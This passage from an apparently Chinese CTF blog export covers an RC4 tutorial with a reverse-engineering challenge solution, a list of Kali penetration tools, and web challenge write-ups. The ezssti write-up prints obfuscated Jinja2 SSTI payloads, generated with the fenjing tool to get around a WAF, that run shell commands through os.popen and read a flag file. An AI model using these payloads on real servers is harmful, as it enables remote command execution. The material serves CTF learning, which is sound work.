j ，使用j=(j+s[i]+k[i])%256，得到 j 是几；然后 i 和 j 作为s盒的索引，进行随机化处理。因此，\n1 2 3 4 j=(j+s[i]+k[i])%256; tmp=s[i]; s[i]=s[j];//交换s[i]和s[j] s[j]=tmp; 这一部分是根据密钥来打乱s盒，i 确保S-box的每个元素都得到处理，j 保证S-box的搅乱是随机的。\nPRGA\r接下来我们来看看随即子密码生成算法，即加解密的过程\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 c /*加解密*/ void rc4_crypt(unsigned char*s,unsigned char*Data,unsigned long Len) { int i=0,j=0,t=0; unsigned long k=0; unsigned char tmp; for(k=0;k\u0026lt;Len;k++) { i=(i+1)%256; j=(j+s[i])%256; tmp=s[i]; s[i]=s[j];//交换s[x]和s[y] s[j]=tmp; t=(s[i]+s[j])%256; Data[k]^=s[t]; } } 参数1是上边rc4_init函数中，被搅乱的S-box;\n参数2是需要加密的数据data;\n参数3是data的长度.\n我们看到我们现在填入了要加密的内容，来分析一下加密的过程。\n首先是在KSA中被打乱的s盒，这时候我们就不再需要密钥了，我们继续对s盒中的元素进行处理。\n通过对s盒中的元素的索引 i 和 j 进行处理：\n1 2 3 4 5 i=(i+1)%256; j=(j+s[i])%256; tmp=s[i]; s[i]=s[j];//交换s[x]和s[y] s[j]=tmp; 这一部分，我们使 i 加一，得到新的 i 然后 j 等于 j 加上新的 i 索引的数字，然后 i 和 j 定位了新的位置，然后通过t=(s[i]+s[j])%256;，来得到密钥流，最后使用密钥流和要加密的数据进行异或得到密文。\n即每收到一个字节，就进行while循环。通过一定的算法定位S盒中的一个元素，并与输入字节异或，得到k。循环中还改变了S盒。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。\n我们来看看完整的程序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 c //程序开始 #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; typedef unsigned longULONG; /*初始化函数*/ void rc4_init(unsigned char*s, unsigned char*key, unsigned long Len) { int i = 0, j = 0; char k[256] = { 0 }; unsigned char tmp = 0; for (i = 0; i\u0026lt;256; i++) { s[i] = i; k[i] = key[i%Len]; } for (i = 0; i\u0026lt;256; i++) { j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j];//交换s[i]和s[j] s[j] = tmp; } } /*加解密*/ void rc4_crypt(unsigned char*s, unsigned char*Data, unsigned long Len) { int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k\u0026lt;Len; k++) { i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j];//交换s[x]和s[y] s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] ^= s[t]; } } int main() { unsigned char s[256] = { 0 }, s2[256] = { 0 };//S-box char key[256] = { \u0026#34;justfortest\u0026#34; }; char pData[512] = \u0026#34;这是一个用来加密的数据Data\u0026#34;; unsigned long len = strlen(pData); int i; printf(\u0026#34;pData=%s\\n\u0026#34;, pData); printf(\u0026#34;key=%s,length=%d\\n\\n\u0026#34;, key, strlen(key)); rc4_init(s, (unsigned char*)key, strlen(key));//已经完成了初始化 printf(\u0026#34;完成对S[i]的初始化，如下：\\n\\n\u0026#34;); for (i = 0; i\u0026lt;256; i++) { printf(\u0026#34;%02X\u0026#34;, s[i]); if (i \u0026amp;\u0026amp; (i + 1) % 16 == 0)putchar(\u0026#39;\\n\u0026#39;); } printf(\u0026#34;\\n\\n\u0026#34;); for (i = 0; i\u0026lt;256; i++)//用s2[i]暂时保留经过初始化的s[i]，很重要的！！！ { s2[i] = s[i]; } printf(\u0026#34;已经初始化，现在加密:\\n\\n\u0026#34;); rc4_crypt(s, (unsigned char*)pData, len);//加密 printf(\u0026#34;pData=%s\\n\\n\u0026#34;, pData); printf(\u0026#34;已经加密，现在解密:\\n\\n\u0026#34;); //rc4_init(s,(unsignedchar*)key,strlen(key));//初始化密钥 rc4_crypt(s2, (unsigned char*)pData, len);//解密 printf(\u0026#34;pData=%s\\n\\n\u0026#34;, pData); return 0; } //程序完 这时候有人就要问了，你写这么绕，这么模糊谁能看得懂啊？\n所以我们来举几个例子帮助理解：\n加密流程详解\r一、数学实现\n初始化S盒（Key Scheduling Algorithm, KSA） 初始状态：S盒是一个长度为256的数组（S[0], S[1], …, S[255]），初始时按顺序填充0到255：\n1 2 plaintext S[0] = 0, S[1] = 1, ..., S[255] = 255 密钥预处理：如果密钥长度不足256字节，循环重复密钥直到填满256字节。例如密钥是KEY（3字节），则扩展为K E Y K E Y K E Y ...。\n洗牌算法：\n1 2 3 4 5 python j = 0 for i in 0到255: j = (j + S[i] + 密钥[i % 密钥长度]) % 256 # 用密钥决定交换位置 交换 S[i] 和 S[j] 关键点：密钥的每个字节都会影响洗牌过程，但前几个字节的影响可能被后续步骤覆盖。\n生成密钥流（Pseudo-Random Generation Algorithm, PRGA） 初始化指针：i = 0, j = 0\n循环生成每个密钥字节：\n1 2 3 4 5 6 python i = (i + 1) % 256 # i每次向前移动1步 j = (j + S[i]) % 256 # j根据S[i]的值跳跃 交换 S[i] 和 S[j] # 动态打乱S盒 t = (S[i] + S[j]) % 256 # 计算索引t 密钥字节 = S[t] # 输出密钥流的一个字节 关键点：每生成一个密钥字节，S盒的状态都会改变，密钥流依赖于动态变化的S盒。\n二、举个具体例子\n示例1：初始化S盒\n假设密钥是[0x01, 0x02, 0x03]（3字节）：\n初始化S盒\n：\n1 2 plaintext S = [0,1,2,3, ..., 255] 洗牌过程\n（前3步演示）：\ni=0\n：\nj = (0 + S[0] + Key[0]) % 256 = (0 + 0 + 1) % 256 = 1 交换 S[0] 和 S[1] → S变为 [1,0,2,3, ..., 255] i=1\n：\nj = (1 + S[1] + Key[1]) % 256 = (1 + 0 + 2) % 256 = 3 交换 S[1] 和 S[3] → S变为 [1,3,2,0, ..., 255] i=2\n：\nj = (3 + S[2] + Key[2]) % 256 = (3 + 2 + 3) % 256 = 8 交换 S[2] 和 S[8] → S[8]的值被换到位置2。 …（持续到i=255）\n示例2：生成密钥流\n假设初始化后的S盒为 [3, 1, 4, 0, 2, 5, ...]（简化举例）：\n第1个密钥字节\n：\ni = (0 + 1) = 1 j = (0 + S[1]) = 0 + 1 = 1 交换 S[1] 和 S[1]（无变化） t = (S[1] + S[1]) = 1 + 1 = 2 密钥字节 = S[2] = 4 → 密钥流第一个字节是4 第2个密钥字节\n：\ni = 2 j = (1 + S[2]) = 1 + 4 = 5 交换 S[2] 和 S[5] → S[2]=5, S[5]=4 t = (5 + 4) = 9 → 密钥字节 = S[9] … 例题\r接下来我们看看RC4算法在CTF中的具体实现\n[BabyAlgorithm](https://buuoj.cn/challenges#[第五章 CTF之RE章]BabyAlgorithm)\n导入IDA，查看main函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 c __int64 __fastcall main(int a1, char **a2, char **a3) { __int64 result; // rax int i; // [rsp+Ch] [rbp-E4h] char v5[16]; // [rsp+10h] [rbp-E0h] BYREF char s[64]; // [rsp+20h] [rbp-D0h] BYREF char v7[64]; // [rsp+60h] [rbp-90h] BYREF char v8[72]; // [rsp+A0h] [rbp-50h] BYREF unsigned __int64 v9; // [rsp+E8h] [rbp-8h] v9 = __readfsqword(0x28u); memset(v8, 0, 0x40uLL); v8[0] = 0xC6; v8[1] = 0x21; v8[2] = 0xCA; v8[3] = 0xBF; v8[4] = 0x51; v8[5] = 0x43; v8[6] = 0x37; v8[7] = 0x31; v8[8] = 0x75; v8[9] = 0xE4; v8[0xA] = 0x8E; v8[0xB] = 0xC0; v8[0xC] = 0x54; v8[0xD] = 0x6F; v8[0xE] = 0x8F; v8[0xF] = 0xEE; v8[0x10] = 0xF8; v8[0x11] = 0x5A; v8[0x12] = 0xA2; v8[0x13] = 0xC1; v8[0x14] = 0xEB; v8[0x15] = 0xA5; v8[0x16] = 0x34; v8[0x17] = 0x6D; v8[0x18] = 0x71; v8[0x19] = 0x55; v8[0x1A] = 8; v8[0x1B] = 7; v8[0x1C] = 0xB2; v8[0x1D] = 0xA8; v8[0x1E] = 0x2F; v8[0x1F] = 0xF4; v8[0x20] = 0x51; v8[0x21] = 0x8E; v8[0x22] = 0xC; v8[0x23] = 0xCC; qmemcpy(\u0026amp;v8[0x24], \u0026#34;3S1\u0026#34;, 3); v8[0x28] = 0x40; v8[0x29] = 0xD6; v8[0x2A] = 0xCA; v8[0x2B] = 0xEC; v8[0x2C] = 0xD4; puts(\u0026#34;Input flag: \u0026#34;); __isoc99_scanf(\u0026#34;%63s\u0026#34;, s); if ( strlen(s) == 0x2D ) { strcpy(v5, \u0026#34;Nu1Lctf233\u0026#34;); sub_400874(v5, s, v7); for ( i = 0; i \u0026lt;= 0x2C; ++i ) { if ( v7[i] != v8[i] ) { puts(\u0026#34;GG!\u0026#34;); return 0LL; } } puts(\u0026#34;Congratulations!\u0026#34;); result = 0LL; } else { puts(\u0026#34;GG!\u0026#34;); result = 0LL; } return result; } 注意下面两个函数都有一个共同的特征%256，这是RC4算法的典型特征\nsub_400874 中，sub_40067A()和sub_400753()两个函数都是加密算法，\nsub_40067A()是流密钥的生成，\nsub_400753()是加密。\nsub_400874:\n1 2 3 4 5 6 7 8 9 10 __int64 __fastcall sub_400874(__int64 a1, __int64 a2, __int64 a3) { char v5[264]; // [rsp+20h] [rbp-110h] BYREF unsigned __int64 v6; // [rsp+128h] [rbp-8h] v6 = __readfsqword(0x28u); sub_40067A(a1, v5); sub_400753(v5, a2, a3); return 0LL; } sub_40067A(流密钥生成)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 __int64 __fastcall sub_40067A(const char *a1, __int64 a2) { int v3; // [rsp+10h] [rbp-10h] int i; // [rsp+14h] [rbp-Ch] int j; // [rsp+18h] [rbp-8h] int v6; // [rsp+1Ch] [rbp-4h] v6 = strlen(a1); v3 = 0; for ( i = 0; i \u0026lt;= 255; ++i ) *(_BYTE *)(i + a2) = i; for ( j = 0; j \u0026lt;= 255; ++j ) { v3 = (*(unsigned __int8 *)(j + a2) + v3 + a1[j % v6]) % 256; sub_400646(j + a2, a2 + v3); } return 0LL; } sub_400753(加密)：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 __int64 __fastcall sub_400753(__int64 a1, const char *a2, __int64 a3) { int v5; // [rsp+24h] [rbp-1Ch] int v6; // [rsp+28h] [rbp-18h] size_t v7; // [rsp+30h] [rbp-10h] size_t v8; // [rsp+38h] [rbp-8h] v5 = 0; v6 = 0; v7 = 0LL; v8 = strlen(a2); while ( v7 \u0026lt; v8 ) { v5 = (v5 + 1) % 256; v6 = (v6 + *(unsigned __int8 *)(v5 + a1)) % 256; sub_400646(v5 + a1, a1 + v6); *(_BYTE *)(a3 + v7) = a2[v7] ^ *(_BYTE *)((unsigned __int8)(*(_BYTE *)(v5 + a1) + *(_BYTE *)(v6 + a1)) + a1); ++v7; } return 0LL; } 本题的密钥是 Nu1Lctf233\n加密后的密文是 v8，即\n1 [0xc6,0x21,0xca,0xbf,0x51,0x43,0x37,0x31,0x75,0xe4,0x8e,0xc0,0x54,0x6f,0x8f,0xee,0xf8,0x5a,0xa2,0xc1,0xeb,0xa5,0x34,0x6d,0x71,0x55,0x8,0x7,0xb2,0xa8,0x2f,0xf4,0x51,0x8e,0xc,0xcc,0x33,0x53,0x31,0x0,0x40,0xd6,0xca,0xec,0xd4 ] 这个数组的解出来是乱码,这里base64加utf-8编码就可以得到密文\n1 2 3 4 5 6 7 8 python import base64 a=[0xc6,0x21,0xca,0xbf,0x51,0x43,0x37,0x31,0x75,0xe4,0x8e,0xc0,0x54,0x6f,0x8f,0xee,0xf8,0x5a,0xa2,0xc1,0xeb,0xa5,0x34,0x6d,0x71,0x55,0x8,0x7,0xb2,0xa8,0x2f,0xf4,0x51,0x8e,0xc,0xcc,0x33,0x53,0x31,0x0,0x40,0xd6,0xca,0xec,0xd4] s=\u0026#34;\u0026#34; for i in a: s+=chr(i) print(s) print(str(base64.b64encode(s.encode(\u0026#39;utf-8\u0026#39;)), \u0026#39;utf-8\u0026#39;)) 密文：w4Yhw4rCv1FDNzF1w6TCjsOAVG/Cj8Ouw7hawqLDgcOrwqU0bXFVCAfCssKoL8O0UcKODMOMM1MxAEDDlsOKw6zDlA==\n贴上搜到的脚本，拿到 flag\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 python import base64 def rc4_main(key = \u0026#34;init_key\u0026#34;, message = \u0026#34;init_message\u0026#34;): print(\u0026#34;RC4解密主函数调用成功\u0026#34;) print(\u0026#39;\\n\u0026#39;) s_box = rc4_init_sbox(key) crypt = rc4_excrypt(message, s_box) return crypt def rc4_init_sbox(key): s_box = list(range(256)) print(\u0026#34;原来的 s 盒：%s\u0026#34; % s_box) print(\u0026#39;\\n\u0026#39;) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] print(\u0026#34;混乱后的 s 盒：%s\u0026#34;% s_box) print(\u0026#39;\\n\u0026#39;) return s_box def rc4_excrypt(plain, box): print(\u0026#34;调用解密程序成功。\u0026#34;) print(\u0026#39;\\n\u0026#39;) plain = base64.b64decode(plain.encode(\u0026#39;utf-8\u0026#39;)) plain = bytes.decode(plain) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) print(\u0026#34;res用于解密字符串，解密后是：%res\u0026#34; %res) print(\u0026#39;\\n\u0026#39;) cipher = \u0026#34;\u0026#34;.join(res) print(\u0026#34;解密后的字符串是：%s\u0026#34; %cipher) print(\u0026#39;\\n\u0026#39;) print(\u0026#34;解密后的输出(没经过任何编码):\u0026#34;) print(\u0026#39;\\n\u0026#39;) return cipher a=[0xc6,0x21,0xca,0xbf,0x51,0x43,0x37,0x31,0x75,0xe4,0x8e,0xc0,0x54,0x6f,0x8f,0xee,0xf8,0x5a,0xa2,0xc1,0xeb,0xa5,0x34,0x6d,0x71,0x55,0x8,0x7,0xb2,0xa8,0x2f,0xf4,0x51,0x8e,0xc,0xcc,0x33,0x53,0x31,0x0,0x40,0xd6,0xca,0xec,0xd4] s=\u0026#34;\u0026#34; for i in a: s+=chr(i) s=str(base64.b64encode(s.encode(\u0026#39;utf-8\u0026#39;)), \u0026#39;utf-8\u0026#39;) rc4_main(\u0026#34;Nu1Lctf233\u0026#34;, s) 参考：\nRC4加密算法与逆向方法简析\nRC4加密算法 RC4加密算法及逆向方法初探\n[BUUCTF_N1book_RE_第五章 CTF之RE章]BabyAlgorithm\n最后，家人们，补药用rust写脚本😭😭😭 🤡🤡🤡\n","date":"2025-06-01T10:30:53+08:00","permalink":"https://Oight.github.io/p/rc4/","title":"RC4"},{"content":" 参考： 大学霸 Kali Linux 安全渗透教程\n渗透测试是对用户信息安全措施积极评估的过程。通过系统化的操作和分析，积极发现系统和网络中存在的各种缺陷和弱点，如设计缺陷和技术缺陷。\n渗透所需工具\rsplint unhide scrub pscan examiner ht flawfinder srm driftnet rats nwipe binwalk ddrescue firstaidkit-gui scalpel gparted xmount pdfcrack testdisk dc3dd wipe foremost afftools safecopy sectool-gui scanmem hfsutils unhide sleuthkit cmospwd examiner macchanger secuirty-menus srm ntfs-3g mc firstaidkit-gui ntfsprogs screen net-snmp pcapdiff openvas-scanner hexedit netsed rkhunter powertop sslstrip nebula mutt bonesi tripwire nano proxychains prelude-lml vim-enhanced prewikka iftop wget prelude-manager scamper yum-utils picviz-gui iptraf-ng firstaidkit-plugin-all onenssh nethogs vnstat dnstracer uperf aircrack-ng chkrootkit nload airsnort aide ntop kismet pads trafshow weplab cowpatty wavemon 以上工具大都集成于Kali linux中\n","date":"2025-06-01T10:30:35+08:00","image":"https://www.ddosi.org/wp-content/uploads/2022/02/24.webp","permalink":"https://Oight.github.io/p/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/","title":"渗透攻击学习"},{"content":"Web\r1.Sign in\r创建实例查看源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 php Flag is not here! \u0026lt;?php error_reporting(0); include_once \u0026#39;flag.php\u0026#39;; if ($_SERVER[\u0026#39;QUERY_STRING\u0026#39;]) { if (preg_match(\u0026#34;/[A-Za-z]+/\u0026#34;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;])) { die(\u0026#34;I hate English!\u0026#34;); } if (substr(md5($_POST[\u0026#39;nsilab\u0026#39;]), 0, 4) !== \u0026#34;ba3f\u0026#34; || $_GET[\u0026#39;hi\u0026#39;] !== \u0026#34;web\u0026#34;) { die(\u0026#34;Oops! It\u0026#39;s wrong!\u0026#34;); } if ($_COOKIE[\u0026#39;user\u0026#39;] !== \u0026#39;admin\u0026#39;) { die(\u0026#34;You are not admin!\u0026#34;); } locate(); } else { highlight_file(__FILE__); } ?\u0026gt; 经典的绕过签到题，我们发现三层过滤。\n第一层使用正则表达式匹配了英文字母，因此我们在传递参数的时候要进行转码\n第二层使用POST参数传递nsilab，要求nsilab值的MD5编码前四位是ba3f；\n这里用脚本来匹配MD5\n1 2 3 4 5 6 7 8 9 10 11 12 13 python import hashlib target = \u0026#34;ba3f\u0026#34; for i in range(1000000): s = str(i) hash_md5 = hashlib.md5(s.encode()).hexdigest() if hash_md5.startswith(target): print(f\u0026#34;Found: {s} → {hash_md5}\u0026#34;) break // Found: 35350 → ba3fe3d296f3e7269b66f163d31b3dc3 用GET方式传参hi = web，对这里进行URL编码，将参数名和值URL编码为十六进制形式：\nhi → %68%69（h的ASCII码是0x68，i是0x69）\nweb → %77%65%62（w=0x77, e=0x65, b=0x62）\n构造查询字符串\n：\n1 2 plaintext ?%68%69=%77%65%62 第三层在COOKIE传参更改user = admin\n传参后发现弹出窗口提示flag要飞走了，使用BurpSuite抓包发现flag\n2.ezssti\r由题，得到这是一道SSTI\n进去尝试传递49，返回“你是…Hacker!!!吗？”可知这里存在过滤。\n使用焚靖来绕过waf自动SSTI\nfenjing crack -u “http://contest.ctf.nefu.edu.cn:33099/“ -i name -m GET –detect-mode fast\n成功绕过，ls一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $\u0026gt;\u0026gt; ls INFO:[full_payload_gen] | Start generating final expression... INFO:[payload_gen] | Great, string(\u0026#39;ls\u0026#39;) can be \u0026#39;l\u0026#39;+\u0026#39;s\u0026#39; INFO:[payload_gen] | Great, we generate os_popen_obj(\u0026#39;ls\u0026#39;) INFO:[payload_gen] | Great, we generate os_popen_read(\u0026#39;ls\u0026#39;) INFO:[cli] | Submit payload {{ ((cycler.next[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;u\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;n\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;p\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;r\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))(\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).popen(\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;).read() }} \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;请告诉我你的名字~\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container mt-5\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;请告诉我你的名字：\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;kimi no namai wa?\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;Your Name:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;name\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;Type Your Name Here\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div class=\u0026#34;alert alert-info\u0026#34;\u0026gt;你是... app.py 吗？\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 只发现了 app.py\nls -a 同样只有app.py\n用cd .. \u0026amp;\u0026amp; ls -a 到根目录下看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 $\u0026gt;\u0026gt; cd .. \u0026amp;\u0026amp; ls -a INFO:[full_payload_gen] | Start generating final expression... INFO:[payload_gen] | Great, string(\u0026#39;cd .. \u0026amp;\u0026amp; ls -a\u0026#39;) can be \u0026#39;c\u0026#39;+\u0026#39;d\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;\u0026amp;\u0026#39;+\u0026#39;\u0026amp;\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;-\u0026#39;+\u0026#39;a\u0026#39; INFO:[payload_gen] | Great, we generate os_popen_obj(\u0026#39;cd .. \u0026amp;\u0026amp; ls -a\u0026#39;) INFO:[payload_gen] | Great, we generate os_popen_read(\u0026#39;cd .. \u0026amp;\u0026amp; ls -a\u0026#39;) INFO:[cli] | Submit payload {{ ((cycler.next[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;][\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;b\u0026#39;+\u0026#39;u\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;n\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))[\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;e\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;](\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;i\u0026#39;+\u0026#39;m\u0026#39;+\u0026#39;p\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;r\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39;_\u0026#39;+\u0026#39;_\u0026#39;))(\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).popen(\u0026#39;c\u0026#39;+\u0026#39;d\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;\u0026amp;\u0026#39;+\u0026#39;\u0026amp;\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;s\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;-\u0026#39;+\u0026#39;a\u0026#39;).read() }} \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;请告诉我你的名字~\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container mt-5\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;请告诉我你的名字：\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;kimi no namai wa?\u0026lt;/p\u0026gt; \u0026lt;form method=\u0026#34;GET\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;Your Name:\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;name\u0026#34; name=\u0026#34;name\u0026#34; placeholder=\u0026#34;Type Your Name Here\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div class=\u0026#34;alert alert-info\u0026#34;\u0026gt;你是... . .. .dockerenv .flll4ggggg app bin dev etc home lib media mnt opt proc root run sbin srv start.sh sys tmp usr var 吗？\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 发现.flll4gggg文件，cat一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 $\u0026gt;\u0026gt; cat /.flll4ggggg INFO:[full_payload_gen] | Start generating final expression... INFO:[payload_gen] | Great, string(\u0026#39;cat /.flll4ggggg\u0026#39;) can be \u0026#39;c\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;t\u0026#39;+\u0026#39; \u0026#39;+\u0026#39;/\u0026#39;+\u0026#39;.\u0026#39;+\u0026#39;f\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;l\u0026#39;+\u0026#39;4\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39;+\u0026#39;g\u0026#39; INFO:[payload_gen] | Great, we generate os_popen_obj(\u0026#39;cat /.flll4ggggg\u0026#39;) INFO:[payload_gen] | Great, we generate os_popen_read(\u0026#39;cat /.flll4ggggg\u0026#39;) INFO:[cli] | Submit payload {{ 